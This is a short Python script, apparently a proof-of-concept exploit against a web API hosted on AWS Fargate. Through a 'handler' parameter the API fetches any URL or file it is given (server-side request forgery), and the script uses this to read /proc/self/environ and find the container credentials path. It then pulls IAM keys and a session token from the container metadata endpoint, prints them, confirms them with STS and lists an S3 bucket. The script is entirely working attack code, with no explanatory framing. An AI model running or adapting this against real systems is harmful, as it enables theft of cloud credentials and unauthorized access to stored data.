import requests
import json
import boto3

env_raw = requests.post("https://fargate-api.domain.name", data={"handler":"file:///proc/self/environ"}).text
env_vars = json.loads(env_raw).get("content").split("\u0000")
for env_var in env_vars:
    if "=" in env_var:
        key, value = env_var.split("=")
        if key == "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI":
            creds_url = value
creds_raw = requests.post("https://fargate-api.domain.name", data={"handler":"http://169.254.170.2"+creds_url}).text
creds_json = json.loads(creds_raw)
creds = json.loads(creds_json["content"])
role = creds["RoleArn"]
access_key = creds["AccessKeyId"]
secret_key = creds["SecretAccessKey"]
session_token = creds["Token"]
print(f"role:{role}\naccess_key:{access_key}\nsecret_key:{secret_key}\nsession_token:{session_token}\n")

sts_client = boto3.client(
    'sts',
    aws_access_key_id=access_key,
    aws_secret_access_key=secret_key,
    aws_session_token=session_token,
)

print(sts_client.get_caller_identity())

s3_client = boto3.client(
    's3',
    aws_access_key_id=access_key,
    aws_secret_access_key=secret_key,
    aws_session_token=session_token,
)
objects = s3_client.list_objects(Bucket='domain.name').get("Contents", {})
print(objects)
